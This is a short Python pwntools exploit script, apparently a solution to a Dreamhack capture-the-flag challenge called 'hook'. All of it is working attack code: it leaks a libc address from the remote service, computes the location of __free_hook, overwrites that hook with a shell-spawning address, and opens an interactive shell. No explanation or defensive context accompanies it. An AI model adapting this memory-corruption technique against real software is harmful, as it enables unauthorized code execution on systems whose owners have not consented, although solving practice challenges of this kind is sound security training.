from pwn import *

p = remote('host8.dreamhack.games', 14745)
e = ELF('./hook')
libc = ELF('libc-2.23.so')
system = 0x0000000000400a11

p.recvuntil('stdout: ')
stdout = int(p.recv(14), 16)
base = stdout - libc.symbols['_IO_2_1_stdout_']
hook = base + libc.symbols['__free_hook']

payload = p64(hook) + p64(system)

p.sendlineafter('Size:', '20')
p.sendline(payload)

p.interactive()